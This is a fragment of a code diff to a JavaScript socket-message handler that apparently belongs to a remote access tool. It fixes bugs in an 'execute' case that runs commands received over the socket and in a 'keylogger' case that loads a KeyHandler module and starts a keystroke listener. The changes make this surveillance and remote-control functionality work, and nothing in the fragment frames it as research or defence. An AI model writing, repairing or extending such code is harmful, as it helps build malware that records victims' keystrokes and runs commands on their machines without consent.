@@ -21,10 +21,10 @@ class HandleSocketMessage
                 console.log(objMessage.body);
                 break;
             case "execute":
-                this.caseExecCommand(strMessage.body.command)
+                this.caseExecCommand(objMessage.body.command)
                 break;
             case "keylogger":
-                this.caseStartKeylogger(strMessage.body.command)
+                this.caseStartKeylogger()
                 break;
             default:
                 console.log("Message not configured!");
@@ -48,7 +48,7 @@ class HandleSocketMessage
 
     caseStartKeylogger(strCommand)
     {
-	    const objKeyHandler = require("./remote/KeyHandler");
+	    const objKeyHandler = require("./KeyHandler");
         objKeyHandler.startListener();
     }
 
